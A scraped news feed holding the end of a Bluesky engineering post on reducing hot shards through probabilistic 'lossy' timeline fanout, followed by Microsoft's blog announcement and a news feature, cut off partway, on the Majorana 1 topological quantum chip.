<p>Under normal circumstances with all users behaving well, this doesn’t present a problem as the work of an individual Timeline is small enough that a shard can handle the work of tens of thousands of them without being heavily taxed.</p>

<p>Unfortunately, with a large number of users, some of them will do abnormal things like… well… following hundreds of thousands of other users.</p>

<p>Generally, this can be dealt with via policy and moderation to prevent abusive users from causing outsized load on systems, but these processes take time and can be imperfect.</p>

<p>When a user follows hundreds of thousands of others, their Timeline becomes hyperactive with writes and trimming occurring at massively elevated rates.</p>

<p>This load slows down the individual operations to the user’s Timeline, which is fine for the bad behaving user, but causes problems to the tens of thousands of other users sharing a shard with them.</p>

<p>We typically call this situation a “Hot Shard”: where some resident of a shard has “hot” data that is being written to or read from at much higher rates than others. Since the data on the shard is only replicated a few times, we can’t effectively leverage the horizontal scale of our database to process all this additional work.</p>

<p>Instead, the “Hot Shard” ends up spending so much time doing work for a single partition that operations to the colocated partitions slow down as well.</p>

<p><img src="https://jazco.dev/public/images/2025-02-19/hot_shard_cpu.png" alt="btop output showing some cores at 100% cpu util but not others"></p>

<h2 id="stacking-latencies">Stacking Latencies</h2>

<p>Returning to our Fanout process, let’s consider the case of Fanout for a user followed by 2,000,000 other users.</p>

<p>Under normal circumstances, writing to a single Timeline takes an average of ~600 microseconds. If we sequentially write to the Timelines of our user’s followers, we’ll be sitting around for 20 minutes at best to Fanout this post.</p>

<p>If instead we concurrently Fanout to 1,000 Timelines at once, we can complete this Fanout job in ~1.2 seconds.</p>

<p>That sounds great, except it oversimplifies an important property of systems: <a href="https://web.archive.org/web/20200603133348/https://robertovitillo.com/why-you-should-measure-tail-latencies/">tail latencies</a>.</p>

<p>The <em>average</em> latency of a write is ~600 microseconds, but some writes take much less time and some take much more. In fact, the P99 latency of writes to the Timelines cluster can be as high as 15 milliseconds!</p>

<p><img src="https://jazco.dev/public/images/2025-02-19/write_latencies.png" alt="Graph of write latency P99s on Timelines cluster with spikes poking past 10ms"></p>

<p>What does this mean for our Fanout? Well, if we concurrently write to 1,000 Timelines at once, statistically we’ll see 10 writes as slow as or slower than 15 milliseconds.</p>

<p>In the case of timelines, each “page” of followers is 10,000 users large and each “page” must be fanned out before we fetch the next page.</p>

<p>This means that our slowest writes will hold up the fetching and Fanout of the next page. How does this affect our expected Fanout time?</p>

<p>Each “page” will have ~100 writes as slow as or slower than the P99 latency. If we get unlucky, they could all stack up on a single routine and end up slowing down a single page of Fanout to 1.5 seconds.</p>

<p>In the worst case, for our 2,000,000 Follower celebrity, their post Fanout could end up taking as long as 5 minutes!</p>

<p>That’s not even considering P99.9 and P99.99 latencies which could end up being &gt;1 second, which could leave us waiting tens of minutes for our Fanout job.</p>

<p>Now imagine how bad this would be for a user with 20,000,000+ Followers!</p>

<p>So, how do we fix the problem? By embracing imperfection, of course!</p>

<h2 id="lossy-timelines">Lossy Timelines</h2>

<p>Imagine a user who follows hundreds of thousands of others. Their Timeline is being written to hundreds of times a second, moving so fast it would be humanly impossible to keep up with the entirety of their Timeline even if it was their full-time job.</p>

<p>For a given user, there’s a threshold beyond which it is <em>unreasonable</em> for them to be able to keep up with their Timeline. Beyond this point, they likely consume content through various other feeds and do not primarily use their Following Feed.</p>

<p>Additionally, beyond this point, it is <em>reasonable</em> for us to not necessarily have a perfect chronology of everything posted by the many thousands of users they follow, but provide enough content that the Timeline always has something new.</p>

<p><em>Note in this case I’m using the term “reasonable” to loosely convey that as a social media service, there must be a limit to the amount of work we are expected to do for a single user.</em></p>

<p>What if we introduce a mechanism to reduce the correctness of a Timeline such that there is a limit to the amount of work a single Timeline can place on a DB shard.</p>

<p>We can assert a <code>reasonable limit</code> for the number of follows a user should have to have a healthy and active Timeline, then increase the “lossiness” of their Timeline the further past that limit they go.</p>

<p>A <code>loss_factor</code> can be defined as <code>min(reasonable_limit/num_follows, 1)</code> and can be used to probabilistically drop writes to a Timeline to prevent hot shards.</p>

<p>Just before writing a page in Fanout, we can generate a random float between <code>0</code> and <code>1</code>, then compare it to the <code>loss_factor</code> of each user in the page. If the user’s <code>loss_factor</code> is smaller than the generated float, we filter the user out of the page and don’t write to their Timeline.</p>

<p>Now, users all have the same number of “follows worth” of Fanout. For example with a <code>reasonable_limit</code> of 2,000, a user who follows 4,000 others will have a <code>loss_factor</code> of <code>0.5</code> meaning half the writes to their Timeline will get dropped. For a user following 8,000 others, their loss factor of <code>0.25</code> will drop 75% of writes to their Timeline.</p>

<p>Thus, each user has a effective ceiling on the amount of Fanout work done for their Timeline.</p>

<p>By specifying the limits of <em>reasonable</em> user behavior and embracing imperfection for users who go beyond it, we can continue to provide service that meets the expectations of users without sacrificing scalability of the system.</p>

<h3 id="aside-on-caching">Aside on Caching</h3>

<p>We write to Timelines at a rate of more than one million times a second during the busy parts of the day. Looking up the number of follows of a given user before fanning out to them would require more than one million additional reads per second to our primary database cluster. This additional load would not be well received by our database and the additional cost wouldn’t be worth the payoff for faster Timeline Fanout.</p>

<p>Instead, we implemented an approach that caches high-follow accounts in a Redis sorted set, then each instance of our Fanout service loads an updated version of the set into memory every 30 seconds.</p>

<p>This allows us to perform lookups of follow counts for high-follow accounts millions of times per second per Fanount service instance.</p>

<p>By caching values which don’t need to be perfect to function correctly in this case, we can once again embrace imperfection in the system to improve performance and scalability without compromising the function of the service.</p>

<h2 id="results">Results</h2>

<p>We implemented Lossy Timelines a few weeks ago on our production systems and saw a dramatic reduction in hot shards on the Timelines database clusters.</p>

<p>In fact, there now appear to be no hot shards in the cluster at all, and the P99 of a page of Fanout work has been reduced by over 90%.</p>

<p><img src="https://jazco.dev/public/images/2025-02-19/single_page_fanout_drop.png" alt="Single Page Fanout Latency Graph"></p>

<p>Additionally, with the reduction in write P99s, the P99 duration for a full post Fanout has been reduced by over 96%. Jobs that used to take 5-10 minutes for large accounts now take &lt;10 seconds.</p>

<p><img src="https://jazco.dev/public/images/2025-02-19/fanout_p99_before.png" alt="Fanout Job Before P99 Latency Graph"></p>

<p><img src="https://jazco.dev/public/images/2025-02-19/fanout_p99_after.png" alt="Fanout Job After P99 Latency Graph"></p>

<p>Knowing where it’s okay to be imperfect lets you trade consistency for other desirable aspects of your systems and scale ever higher.</p>

<p>There are plenty of other places for improvement in our Timelines architecture, but this step was a big one towards improving throughput and scalability of Bluesky’s Timelines.</p>

<p>If you’re interested in these sorts of problems and would like to help us build the core data services that power Bluesky, check out <a href="https://jobs.gem.com/bluesky/am9icG9zdDojUfV5u9SSp_tydYRdQe9D">this job listing</a>.</p>

<p>If you’re interested in other open positions at Bluesky, you can find them <a href="https://bsky.social/about/join">here</a>.</p>

</article>





      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft unveils Majorana 1 quantum processor (314 pts)]]></title>
            <link>https://azure.microsoft.com/en-us/blog/quantum/2025/02/19/microsoft-unveils-majorana-1-the-worlds-first-quantum-processor-powered-by-topological-qubits/</link>
            <guid>43104071</guid>
            <pubDate>Wed, 19 Feb 2025 16:35:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://azure.microsoft.com/en-us/blog/quantum/2025/02/19/microsoft-unveils-majorana-1-the-worlds-first-quantum-processor-powered-by-topological-qubits/">https://azure.microsoft.com/en-us/blog/quantum/2025/02/19/microsoft-unveils-majorana-1-the-worlds-first-quantum-processor-powered-by-topological-qubits/</a>, See on <a href="https://news.ycombinator.com/item?id=43104071">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-bi-an="Blog Body">
					

					
<p><em>Built with a breakthrough class of materials called a topoconductor, Majorana 1 marks a transformative leap toward practical quantum computing.</em></p>



<p>Quantum computers promise to transform science and society—but only after they achieve the scale that once seemed distant and elusive, and their reliability is ensured by quantum error correction. Today, we’re announcing rapid advancements on the path to useful quantum computing:</p>



<ul>
<li><strong>Majorana 1</strong>: the world’s first Quantum Processing Unit (QPU) powered by a Topological Core, designed to scale to a million qubits on a single chip.</li>



<li><strong>A hardware-protected topological qubit</strong>: research published today in <a href="https://aka.ms/MSQuantumNaturePaper" target="_blank" rel="noreferrer noopener"><em>Nature</em></a>, along with data shared at the Station Q meeting, demonstrate our ability to harness a new type of material and engineer a radically different type of qubit that is small, fast, and digitally controlled.</li>



<li><strong>A <a href="https://aka.ms/MSBrandArXivTopo" target="_blank" rel="noreferrer noopener">device roadmap</a> to reliable quantum computation</strong>: our path from single-qubit devices to arrays that enable quantum error correction.</li>



<li><strong>Building the world’s first fault-tolerant prototype (FTP) based on topological qubits</strong>: Microsoft is on track to build an FTP of a scalable quantum computer—in years, not decades—as part of the final phase of the Defense Advanced Research Projects Agency (DARPA) Underexplored Systems for Utility-Scale Quantum Computing (US2QC) program.</li>
</ul>



<p>Together, these milestones mark a pivotal moment in quantum computing as we advance from scientific exploration to technological innovation.</p>


<div data-moray="" data-bi-an="CTA Block">

			
			<div>
					
					<h2>Microsoft Quantum Innovator Series</h2>

					<p>Join Chetan Nayak to learn about the advancements Microsoft is making in quantum computing.</p>

											
									</div>

							<p><img decoding="async" width="1024" height="576" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-1024x576.webp" alt="Chetan Nayak's headshot." srcset="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-1024x576.webp 1024w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-300x169.webp 300w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-768x432.webp 768w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-1536x864.webp 1536w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot.webp 1920w" sizes="(max-width: 1024px) 100vw, 1024px">				</p>
					</div>



<h2 id="harnessing-a-new-type-of-material">Harnessing a new type of material</h2>



<p>All of today’s announcements build on our team’s recent breakthrough: the world’s first topoconductor. This revolutionary class of materials enables us to create <em>topological superconductivity,</em> a <a href="https://journals.aps.org/prb/pdf/10.1103/PhysRevB.107.245423" target="_blank" rel="noreferrer noopener">new state of matter</a> that previously existed only in theory. The advance stems from Microsoft’s innovations in the design and fabrication of gate-defined devices that combine indium arsenide (a semiconductor) and aluminum (a superconductor). When cooled to near absolute zero and tuned with magnetic fields, these devices form topological superconducting nanowires with Majorana Zero Modes (MZMs) at the wires’ ends.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;67b6230045a7d&quot;}" data-wp-interactive="core/image"><img decoding="async" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Measurement-graphic.webp" alt="A graphic showcasing reliably reading quantum information: ease of measurement and distinct results." srcset="" data-orig-src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Measurement-graphic.webp"><figcaption><em>Figure 1: Reading the state of our topological qubit</em>.</figcaption></figure>



<p>For nearly a century, these quasiparticles existed only in textbooks. Now, we can <a href="https://quantum.microsoft.com/en-us/solutions/microsoft-quantum-hardware" target="_blank" rel="noreferrer noopener">create and control them on demand in our topoconductors</a>. MZMs are the building blocks of our qubits, storing quantum information through ‘parity’—whether the wire contains an even or odd number of electrons. In conventional superconductors, electrons bind into Cooper pairs and move without resistance. Any unpaired electron can be detected because its presence requires extra energy. Our topoconductors are different: here, an unpaired electron is shared between a pair of MZMs, making it invisible to the environment. This unique property protects the quantum information.</p>



<p>While this makes our topoconductors ideal candidates for qubits, it also presents a challenge: How do we read quantum information that is so well hidden? How can we distinguish between, say, 1,000,000,000 and 1,000,000,001 electrons?</p>



<p>Our solution to this measurement challenge works as follows (also see Figure 1):</p>



<ul>
<li>We use digital switches to couple both ends of the nanowire to a quantum dot, which is a tiny semiconductor device that can store electrical charge.</li>



<li>This connection increases the dot’s ability to hold charge. Crucially, the exact increase depends on the parity of the nanowire.</li>



<li>We measure this change using microwaves. The dot’s ability to hold charge determines how the microwaves reflect off the quantum dot. As a result, they return carrying an imprint of the nanowire’s quantum state.</li>
</ul>



<p>We designed our devices so these changes are large enough to measure reliably in a single shot. Our initial measurements had an error probability of 1%, and we’ve identified clear paths to significantly reduce this.</p>



<p>Our system shows impressive stability. External energy—such as electromagnetic radiation—can break Cooper pairs, creating unpaired electrons that can flip the qubit’s state from even to odd parity. However, our results show that this is rare, occurring only once per millisecond on average. This indicates that the shielding that envelops our processor is effective at keeping such radiation out. We are exploring ways to reduce this even further.</p>



<p>It’s perhaps not surprising that quantum computation would require us to engineer a new state of matter specifically designed to enable it. What’s remarkable is how accurate our readout technique already is, demonstrating that we are harnessing this exotic state of matter for quantum computation.</p>



<h2 id="revolutionizing-quantum-control-through-digital-precision">Revolutionizing quantum control through digital precision</h2>



<p>This readout technique enables a fundamentally different approach to quantum computing in which measurements are used to perform calculations.</p>



<p>Traditional quantum computing rotates quantum states through precise angles, requiring complex analog control signals customized for each qubit. This complicates quantum error correction (QEC), which must rely on these same sensitive operations to detect and correct errors.</p>



<p>Our measurement-based approach simplifies QEC dramatically. We perform error correction entirely through measurements activated by simple digital pulses that connect and disconnect quantum dots from nanowires. This digital control makes it practical to manage the large numbers of qubits needed for real-world applications.</p>



<h2 id="from-physics-to-engineering">From physics to engineering</h2>


<figure data-wp-context="{&quot;imageId&quot;:&quot;67b6230046960&quot;}" data-wp-interactive="core/image"><img decoding="async" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Device-Roadmap-figure.webp" alt="A roadmap to fault-tolerant quantum computation with tetrons." srcset="" data-orig-src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Device-Roadmap-figure.webp"><figcaption><em>Figure 2: Roadmap to fault-tolerant quantum computation with tetrons. The first panel shows a single-qubit device. The tetron is formed through two parallel topological wires (blue) with an MZM at each end (orange dot) connected by a perpendicular trivial superconducting wire (light blue). The next panel shows a two-qubit device that supports measurement-based braiding transformations. The third panel shows a 4×2 array of tetrons supporting a quantum error detection demonstration on two logical qubits. These demonstrations build toward quantum error correction, such as on the device shown in the right panel (a 27×13 tetron array).</em></figcaption></figure>



<p>With the core building blocks now demonstrated—quantum information encoded in MZMs, protected by topology, and processed through measurements—we’re ready to move from physics breakthrough to practical implementation.</p>



<p>The next step is <a href="https://aka.ms/MSBrandArXivTopo" target="_blank" rel="noreferrer noopener">a scalable architecture</a> built around a single-qubit device called a tetron (see Figure 2). At the Station Q meeting, we shared data demonstrating the basic operation of this qubit. One fundamental operation—measuring the parity of one of the topological nanowires in a tetron—uses the same technique described in our <a href="https://aka.ms/MSQuantumNaturePaper" target="_blank" rel="noreferrer noopener"><em>Nature </em>paper</a>.</p>



<p>Another key operation puts the qubit in a superposition of parity states. This, too, is performed by a microwave reflectometry measurement of a quantum dot, but in a different measurement configuration in which we decouple the first quantum dot from the nanowire and connect a different dot to both nanowires at one end of the device. By performing these two orthogonal Pauli measurements, <em>Z</em> and <em>X</em>, we’ve demonstrated measurement-based control—a crucial milestone that unlocks the next steps on our roadmap.</p>



<p>Our roadmap now leads systematically toward scalable QEC. The next steps will involve a 4×2 tetron array. We will first use a two-qubit subset to demonstrate entanglement and measurement-based braiding transformations. Using the entire eight-qubit array, we will then implement quantum error detection on two logical qubits.</p>



<p>The built-in error protection of topological qubits simplifies QEC. Moreover, our <a href="https://www.microsoft.com/en-us/research/blog/azure-quantum-innovation-efficient-error-correction-of-topological-qubits-with-floquet-codes/" target="_blank" rel="noreferrer noopener">custom QEC codes</a> reduce overhead roughly tenfold compared to <a href="https://www.microsoft.com/en-us/research/publication/optimization-of-the-surface-code-design-for-majorana-based-qubits/" target="_blank" rel="noreferrer noopener">the previous state-of-the-art approach</a>. This dramatic reduction means that our scalable system can be built from fewer physical qubits and has the potential to run at a faster clock speed.</p>



<h2 id="darpa-s-recognition-of-our-approach">DARPA’s recognition of our approach</h2>



<p>The Defense Advanced Research Projects Agency <a href="https://www.darpa.mil/news/2025/quantum-computing-approaches" target="_blank" rel="noreferrer noopener">(DARPA) has selected Microsoft</a> as one of two companies to advance to the final phase of their rigorous benchmarking program known as <a href="https://www.darpa.mil/research/programs/underexplored-systems-for-utility-scale-quantum-computing" target="_blank" rel="noreferrer noopener">Underexplored Systems for Utility-Scale Quantum Computing (US2QC)</a>—one of the programs that makes up DARPA’s larger Quantum Benchmarking Initiative (QBI). Microsoft views this recognition as validation of our roadmap for building a fault-tolerant quantum computer with topological qubits.</p>



<p>DARPA’s US2QC program and its broader Quantum Benchmarking Initiative represent a rigorous approach to evaluating quantum systems that could solve problems that are beyond the capabilities of classical computers. To date, the US2QC program has brought together experts from DARPA, Air Force Research Laboratory, Johns Hopkins University Applied Physics Laboratory, Los Alamos National Laboratory, Oak Ridge National Laboratory, and NASA Ames Research Center to verify quantum hardware, software, and applications. Going forward, the larger Quantum Benchmarking Initiative is expected to engage with even more experts in the testing and evaluation of quantum computers.</p>



<p>Previously, DARPA selected Microsoft for an earlier phase upon an assessment that we could plausibly build a utility-scale quantum computer in a reasonable timeframe. DARPA then evaluated the Microsoft quantum team’s architectural designs and engineering plan for a fault-tolerant quantum computer. As a result of this careful analysis, DARPA and Microsoft have executed an agreement to begin the final phase of the program. During this phase, <strong>Microsoft intends to build a fault-tolerant prototype based on topological qubits in years, not decades</strong>—a crucial acceleration step toward utility-scale quantum computing.</p>



<h2 id="unlocking-quantum-s-promise">Unlocking quantum’s promise</h2>



<p>Eighteen months ago, we laid out our <a href="https://azure.microsoft.com/en-us/blog/quantum/2023/06/21/microsoft-achieves-first-milestone-towards-a-quantum-supercomputer/">roadmap to a quantum supercomputer</a>. <strong>Today we hit our second milestone, demonstrating the world’s first topological qubit. </strong>And we’ve already placed eight topological qubits on a chip designed to house one million.</p>



<p>A million-qubit quantum computer isn’t just a milestone—it’s a gateway to solving some of the world’s most difficult problems. Even today’s most powerful supercomputers cannot accurately predict the quantum processes that determine the properties of the materials essential to our future. But quantum computing at this scale could lead to innovations like self-healing materials that repair cracks in bridges, sustainable agriculture, and safer chemical discovery. What today requires billions of dollars in exhaustive experimental searches and wet-lab experiments could be found, instead, through calculation on a quantum computer.</p>



<p>Our path to useful quantum computing is clear. The foundational technology is proven, and we believe our architecture is scalable. Our new agreement with DARPA shows a commitment to relentless progress toward our goal: building a machine that can drive scientific discovery and solve problems that matter. Stay tuned for more updates on our journey.</p>



<p><strong>Stay informed of Microsoft’s advancements in quantum computing:</strong></p>



<ul>
<li>Check out Dr. Chetan Nayak on the <a href="https://aka.ms/MSRPodTopo" target="_blank" rel="noreferrer noopener">Microsoft Research Podcast</a> as he explores these groundbreaking advances.</li>



<li>Read our papers in <a href="https://aka.ms/MSQuantumNaturePaper" target="_blank" rel="noreferrer noopener"><em>Nature</em></a> and on <a href="https://aka.ms/MSBrandArXivTopo" target="_blank" rel="noreferrer noopener">arXiv</a>.</li>



<li>Join us to <a href="https://aka.ms/QuantumReadyPage" target="_blank" rel="noreferrer noopener">become quantum ready</a>.</li>



<li>Read the <a href="https://aka.ms/MSQuantumSource" target="_blank" rel="noreferrer noopener">Microsoft Source story</a> about today’s news.</li>



<li>Hear the Microsoft quantum team discuss these milestones:</li>
</ul>



<figure><p>
<iframe title="Majorana 1 Explained: The Path to a Million Qubits" width="500" height="281" src="https://www.youtube-nocookie.com/embed/wSHmygPQukQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>





					
<div data-bi-an="Author Bio">
			<div>
						<p><img width="170" height="170" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2020/08/Chetan-Nayak-bio-picture-250x250.jpg" alt="Chetan Nayak bio picture">						</p>
					</div>
			<div>
				<div>
					

											<p>
							Technical Fellow and Corporate Vice President of Quantum Hardware						</p>
					
											
									</div>

									<p>
						Chetan Nayak leads Microsoft’s efforts to build a scaled quantum computer based on topological qubits.					</p>
				
				<p><a href="https://azure.microsoft.com/en-us/blog/quantum/author/chetan-nayak/" data-bi-cn="See more articles from this author" data-bi-id="5331" data-bi-ct="cta link" rel="author" aria-label="
						See more articles from Chetan Nayak					">
					See more articles from this author				</a>
			</p></div>
		</div>

					
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft's Majorana 1 chip carves new path for quantum computing (116 pts)]]></title>
            <link>https://news.microsoft.com/source/features/ai/microsofts-majorana-1-chip-carves-new-path-for-quantum-computing/</link>
            <guid>43103623</guid>
            <pubDate>Wed, 19 Feb 2025 16:06:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.microsoft.com/source/features/ai/microsofts-majorana-1-chip-carves-new-path-for-quantum-computing/">https://news.microsoft.com/source/features/ai/microsofts-majorana-1-chip-carves-new-path-for-quantum-computing/</a>, See on <a href="https://news.ycombinator.com/item?id=43103623">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>Microsoft today <a href="https://news.microsoft.com/azure-quantum/">introduced Majorana 1</a>, the world’s first quantum chip powered by a new Topological Core architecture that it expects will realize quantum computers capable of solving meaningful, industrial-scale problems in years, not decades.</p>



<p>It leverages the world’s first topoconductor, a breakthrough type of material which can observe and control Majorana particles to produce more reliable and scalable qubits, which are the building blocks for quantum computers.</p>



<p>In the same way that the invention of semiconductors made today’s smartphones, computers and electronics possible, <a href="https://aka.ms/MSQuantumAQblog">topoconductors and the new type of chip they enable</a> offer a path to developing quantum systems that can scale to a million qubits and are capable of tackling the most complex industrial and societal problems, Microsoft said.</p>



<p>“We took a step back and said ‘OK, let’s invent the transistor for the quantum age. What properties does it need to have?’” said Chetan Nayak, Microsoft technical fellow. “And that’s really how we got here – it’s the particular combination, the quality and the important details in our new materials stack that have enabled a new kind of qubit and ultimately our entire architecture.”</p>



<figure><img fetchpriority="high" decoding="async" width="319" height="300" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1.jpg" alt="Photo showing a close up of the Majorana 1 quantum chip being held in a hand." srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1.jpg 319w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1-128x120.jpg 128w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1-300x282.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1-213x200.jpg 213w" sizes="(max-width: 319px) 100vw, 319px"><figcaption>The Majorana 1. Photo by John Brecher for Microsoft.</figcaption></figure>



<p>This new architecture used to develop the Majorana 1 processor offers a clear path to fit a million qubits on a single chip that can fit in the palm of one’s hand, Microsoft said. This is a needed threshold for quantum computers to deliver transformative, real-world solutions – such as breaking down microplastics into harmless byproducts or inventing self-healing materials for construction, manufacturing or healthcare. All the world’s current computers operating together can’t do what a one-million-qubit quantum computer will be able to do.&nbsp;</p>



<p>“Whatever you’re doing in the quantum space needs to have a path to a million qubits. If it doesn’t, you’re going to hit a wall before you get to the scale at which you can solve the really important problems that motivate us,” Nayak said.&nbsp; “We have actually worked out a path to a million.”</p>



<p>The topoconductor, or topological superconductor, is a special category of material that can create an entirely new state of matter – not a solid, liquid or gas but a topological state. This is harnessed to produce a more stable qubit that is fast, small and can be digitally controlled, without the tradeoffs required by current alternatives. A new paper published Wednesday in Nature outlines how Microsoft researchers were able to create the topological qubit’s exotic quantum properties and also accurately measure them, an essential step for practical computing.</p>



<figure><img decoding="async" width="1024" height="683" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1024x683.jpg" alt="Photo of Chetan Nayak." srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1024x683.jpg 1024w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-768x512.jpg 768w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1536x1025.jpg 1536w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-300x200.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1900x1268.jpg 1900w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Chetan Nayak, Microsoft technical fellow. Photo by John Brecher for Microsoft.&nbsp;&nbsp;</figcaption></figure>



<p>This breakthrough required developing an entirely new materials stack made of indium arsenide and aluminum, much of which Microsoft designed and fabricated atom by atom. The goal was to coax new quantum particles called Majoranas into existence and take advantage of their unique properties to reach the next horizon of quantum computing, Microsoft said. &nbsp;</p>



<p>The world’s first Topological Core powering the Majorana 1 is reliable by design, incorporating error resistance at the hardware level making it more stable.</p>



<p>Commercially important applications will also require trillions of operations on a million qubits, which would be prohibitive with current approaches that rely on fine-tuned analog control of each qubit. The Microsoft team’s new measurement approach enables qubits to be controlled digitally, redefining and vastly simplifying how quantum computing works.</p>



<p>This progress validates Microsoft’s choice years ago to pursue a topological qubit design – a high risk, high reward scientific and engineering challenge that is now paying off. Today, the company has placed eight topological qubits on a chip designed to scale to one million.</p>



<figure><img loading="lazy" decoding="async" width="1024" height="683" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1024x683.jpg" alt="Photo of Matthias Troyer, Microsoft technical fellow, sitting in a lab.&nbsp;" srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1024x683.jpg 1024w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-768x512.jpg 768w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1536x1025.jpg 1536w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-300x200.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1900x1268.jpg 1900w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Matthias Troyer, Microsoft technical fellow. Photo by John Brecher for Microsoft.&nbsp;</figcaption></figure>



<p>“From the start we wanted to make a quantum computer for commercial impact, not just thought leadership,” said Matthias Troyer, Microsoft technical fellow. “We knew we needed a new qubit. We knew we had to scale.”</p>



<p>That approach led the Defense Advanced Research Projects Agency (DARPA), a federal agency that invests in breakthrough technologies that are important to national security, to include Microsoft in a rigorous program to evaluate whether innovative quantum computing technologies could build commercially relevant quantum systems faster than conventionally believed possible.&nbsp;&nbsp;</p>



<p>Microsoft is now one of two companies to be <a href="https://www.darpa.mil/news/2025/quantum-computing-approaches">invited to move to the final phase</a> of DARPA’s Underexplored Systems for Utility-Scale Quantum Computing (US2QC) program – one of the programs that makes up DARPA’s larger <a href="https://www.darpa.mil/research/programs/quantum-benchmarking-initiative">Quantum Benchmarking Initiative</a> – which aims to deliver the industry’s first utility-scale fault-tolerant quantum computer, or one whose computational value exceeds its costs.&nbsp;</p>



<h2>‘It just gives you the answer’</h2>



<p>In addition to making its own quantum hardware, Microsoft has partnered with Quantinuum and Atom Computing to reach <a href="https://azure.microsoft.com/en-us/blog/quantum/2024/09/10/microsoft-and-quantinuum-create-12-logical-qubits-and-demonstrate-a-hybrid-end-to-end-chemistry-simulation/">scientific and engineering breakthroughs</a> with today’s qubits, including the announcement last year of the <a href="https://azure.microsoft.com/en-us/blog/quantum/2024/11/19/microsoft-and-atom-computing-offer-a-commercial-quantum-machine-with-the-largest-number-of-entangled-logical-qubits-on-record/?msockid=0d710b8d313360371e1f1f27301e6148">industry’s first reliable quantum computer</a>.</p>



<p>These types of machines <a href="https://azure.microsoft.com/en-us/blog/quantum/2025/01/14/2025-the-year-to-become-quantum-ready/?msockid=0d710b8d313360371e1f1f27301e6148">offer important opportunities to develop quantum skills</a>, build hybrid applications and drive new discovery, particularly as AI is combined with new quantum systems that will be powered by larger numbers of reliable qubits. Today, Azure Quantum offers a <a href="https://quantum.microsoft.com/en-us/solutions/azure-quantum-solutions">suite of integrated solutions</a> allowing customers to leverage these leading AI, high performance computing and quantum platforms in Azure to advance scientific discovery.</p>



<p>But reaching the next horizon of quantum computing will require a quantum architecture that can provide a million qubits or more and reach trillions of fast and reliable operations. Today’s announcement puts that horizon within years, not decades, Microsoft said.</p>



<p>Because they can use quantum mechanics to mathematically map how nature behaves with incredible precision – from chemical reactions to molecular interactions and enzyme energies – million-qubit machines should be able to solve certain types of problems in chemistry, materials science and other industries that are impossible for today’s classical computers to accurately calculate.</p>



<ul>
